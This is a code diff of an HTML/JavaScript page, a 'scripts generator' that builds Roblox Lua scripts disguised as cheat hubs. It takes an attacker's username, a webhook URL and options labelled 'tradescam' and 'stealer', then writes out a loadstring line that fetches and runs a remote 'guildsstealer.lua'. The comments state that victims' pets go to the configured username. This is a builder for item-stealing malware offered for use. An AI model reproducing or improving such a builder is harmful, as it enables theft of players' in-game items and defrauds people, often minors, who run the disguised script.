@@ -4,92 +4,181 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Argon X Scripts</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
   <style>
-    /* Global Styles */
     body {
-      font-family: Arial, sans-serif;
-      background-color: #000000; /* Dark purple background */
-      text-align: center;
-      padding: 50px;
+        font-family: Arial, sans-serif;
+        background-color: #f5f5f5; /* Light gray background for less strain */
+        color: #333; /* Dark gray text for better readability */
+        text-align: center;
+        margin: 0;
+        padding: 0;
     }
-
-    /* Container Styles */
     .container {
-      background-color: #ffffff; /* Darker purple background */
-      padding: 20px;
-      border-radius: 8px;
-      display: inline-block;
+        max-width: 800px;
+        margin: 50px auto;
+        padding: 20px;
+        background: #ffffff; /* White background for the container */
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
     }
-
-    /* Input Field Styles */
-    .input-field {
-      margin: 10px 0;
+    h1 {
+        color: #007bff; /* A soothing blue for the header */
     }
-
-    /* Button Styles */
+    form {
+        margin: 20px 0;
+    }
+    input, textarea, select {
+        display: block;
+        width: calc(100% - 22px);
+        margin: 10px auto;
+        padding: 10px;
+        border: 1px solid #ccc; /* Light gray border */
+        border-radius: 5px;
+        font-size: 16px;
+        background-color: #f9f9f9; /* Slightly off-white background for inputs */
+    }
     button {
-      padding: 10px 20px;
-      background-color: #7a49a8; /* Purple button background */
-      color: #ffffff; /* White button text */
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
+        background-color: #007bff; /* Blue button */
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        font-size: 16px;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
     }
-
     button:hover {
-      background-color: #5c3c8a; /* Darker purple button hover */
+        background-color: #0056b3; /* Darker blue on hover */
     }
-
-    /* Output Styles */
-    #output {
-      text-align: left;
-      white-space: pre-wrap;
+    #status {
+        margin-top: 20px;
+        font-size: 16px;
     }
-
-    /* Textarea Styles */
-    textarea {
-      width: 100%;
-      height: 150px;
+    #pastelist {
+        margin-top: 20px;
+        text-align: left;
+        max-width: 600px;
+        margin-left: auto;
+        margin-right: auto;
+    }
+    #pastelist ul {
+        list-style-type: none;
+        padding: 0;
+    }
+    #pastelist li {
+        margin-bottom: 10px;
+    }
+    #pastelist a {
+        color: #007bff;
+        text-decoration: none;
+    }
+    #pastelist a:hover {
+        text-decoration: underline;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>Argon X Scripts Generator!</h1>
-    <form>
+    <form id="scriptForm">
       <label for="username">Username:</label>
       <input type="text" id="username" name="username"><br><br>
+      
       <label for="webhook">Webhook URL:</label>
       <input type="text" id="webhook" name="webhook"><br><br>
-      <label for="minimumRAP">Minimum RAP:</label>
-      <input type="number" id="minimumRAP" name="minimumRAP"><br><br>
-      <button type="button" onclick="generateOutput()">Generate</button>
-      <textarea id="output"></textarea><br><br>
-      <button type="button" onclick="copyToClipboard()">Copy to Clipboard</button>
+      
+      <label for="minimumRap">Minimum RAP:</label>
+      <input type="number" id="minimumRap" name="minimumRap" value="10000"><br><br>
+      
+      <label for="typesui">Types UI:</label>
+      <select id="typesui" name="typesui">
+        <option value="">None</option>
+        <option value="kavo">Kavo</option>
+        <option value="orion">Orion</option>
+        <option value="fluent">Fluent</option>
+      </select><br><br>
+      
+      <label for="typescript">Type Script:</label>
+      <select id="typescript" name="typescript">
+        <option value="dupe">Dupe</option>
+        <option value="tradescam">Tradescam</option>
+      </select><br><br>
+      
+      <label for="scriptname">Script Name:</label>
+      <select id="scriptname" name="scriptname">
+        <option value="nexus hub">Nexus Hub</option>
+        <option value="eclipse hub">Eclipse Hub</option>
+        <option value="clever hub">Clever Hub</option>
+      </select><br><br>
+      
+      <label for="stealer">Stealer:</label>
+      <input type="text" id="stealer" name="stealer"><br><br>
+
+      <button type="button" id="generateBtn">Generate</button>
+      <textarea id="output" readonly></textarea><br><br>
+      <button type="button" id="copyBtn">Copy to Clipboard</button>
     </form>
   </div>
 
   <script>
-    function generateOutput() {
-      const username = document.getElementById("username").value;
-      const username2 = document.getElementById("username2").value;
-      const webhook = document.getElementById("webhook").value;
-      const minimumRAP = document.getElementById("minimumRAP").value;
-      const outputString = `_G.Username = "${username}"\n` +
-                           `_G.Webhook = "${webhook}"\n` +
-                           `_G.MinimumRAP = ${minimumRAP}\n` +
-                           'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Script-Ps99/main/lds.lua",true))()';
-      document.getElementById("output").value = outputString;
-      hljs.highlightAll();
-    }
+    // Make sure DOM is loaded before adding event listeners
+    document.addEventListener("DOMContentLoaded", function() {
+      const generateButton = document.getElementById('generateBtn');
+      const copyButton = document.getElementById('copyBtn');
+      
+      // Add event listener for generate button
+      generateButton.addEventListener('click', function(event) {
+        event.preventDefault(); // Prevent any default form action
+        
+        // Fetching values from input fields
+        const username = document.getElementById("username").value;
+        const webhook = document.getElementById("webhook").value;
+        const minimumRap = document.getElementById("minimumRap").value;
+        const typesui = document.getElementById("typesui").value;
+        const typescript = document.getElementById("typescript").value;
+        const scriptname = document.getElementById("scriptname").value;
+        const stealer = document.getElementById("stealer").value;
 
-    function copyToClipboard() {
-      const copyText = document.getElementById("output");
-      copyText.select();
-      document.execCommand("copy");
-    }
+        // Logging to check if values are fetched correctly
+        console.log("Username:", username);
+        console.log("Webhook:", webhook);
+        console.log("Minimum RAP:", minimumRap);
+        console.log("Types UI:", typesui);
+        console.log("Type Script:", typescript);
+        console.log("Script Name:", scriptname);
+        console.log("Stealer:", stealer);
+
+        // Input validation - check if fields are filled
+        if (!username || !webhook || !minimumRap || !stealer) {
+          alert("Please fill in all required fields.");
+          return;
+        }
+
+        // Generate output string based on the new structure
+const outputString = `config = {\n` +
+                     `    Username = "${username}", -- Username To Send Pets To\n` +
+                     `    Webhook = "${webhook}", -- Webhook URL\n` +
+                     `    MinimumRap = "${minimumRap}", -- Minimum RAP of each item you want to get sent to you\n` +
+                     `    typesui = "${typesui}", -- kavo, orion, fluent\n` +
+                     `    typescript = "${typescript}", -- dupe, tradescam\n` +
+                     `    scriptname = "${scriptname}", -- nexus hub, eclipse hub, clever hub\n` +
+                     `    stealer = "${stealer}", -- ps99, SOON MM2 AND ADOPT ME\n` +
+                     `}\n\n` +
+                     'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/gui-stealer/main/guildsstealer.lua",true))()';
+
+        // Set the output in the textarea
+        document.getElementById("output").value = outputString;
+      });
+
+      // Add event listener for copy button
+      copyButton.addEventListener('click', function() {
+        const copyText = document.getElementById("output");
+        copyText.select();
+        copyText.setSelectionRange(0, 99999); // For mobile devices
+        document.execCommand("copy");
+        alert("Copied to clipboard!");
+      });
+    });
   </script>
 </body>
 </html>
